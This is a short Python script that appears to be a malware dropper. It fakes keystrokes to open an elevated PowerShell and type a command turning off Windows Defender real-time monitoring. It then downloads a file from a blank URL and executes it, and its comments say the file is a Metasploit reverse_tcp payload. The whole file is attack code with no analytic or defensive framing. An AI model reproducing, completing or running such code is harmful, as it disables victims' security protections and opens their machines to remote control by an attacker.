import requests
import subprocess
import os
import sys
import socket
import time
from pynput.keyboard import Key, Controller

def defender():


	keyboard = Controller()

	keyboard.press(Key.cmd)
	keyboard.release(Key.cmd)
	time.sleep(1.1)
	keyboard.type("powershell.exe")
	
	time.sleep(1.1)
	keyboard.press(Key.right)
	keyboard.release(Key.right)
	time.sleep(1.1)
	keyboard.press(Key.down)
	keyboard.release(Key.down)
	time.sleep(1.1)
	keyboard.press(Key.enter)
	keyboard.release(Key.enter)
	time.sleep(1.1)
	keyboard.press(Key.left)
	keyboard.release(Key.left)
	time.sleep(1)
	keyboard.press(Key.enter)
	keyboard.release(Key.enter)

	time.sleep(2)

	keyboard.type("Set-MpPreference -DisableRealtimeMonitoring $true")
	keyboard.press(Key.enter)
	keyboard.release(Key.enter)
	# This function can't disable windows defender!


def download(url): # download the file from online
	get_response = requests.get(url)
	file_name = url.split("/")[-1]
	with open(file_name, "wb") as out_file:
		out_file.write(get_response.content)

def run(file): # checks if this program is ran on the desktop
	current = os.getcwd()
	if "Desktop" not in current:  
		print("Please Run On Desktop!")
		sys.exit(3)

	process_start = subprocess.check_output(file, shell=True) # runs the file for the reverse_tcp connection on metasploit payload
	process_stop = os.system("exit")



defender() # windows patched this method of disabling windows defender
download("") # this is going to be the the link where the file is located online to download
run("") # this runs the file name of the payload
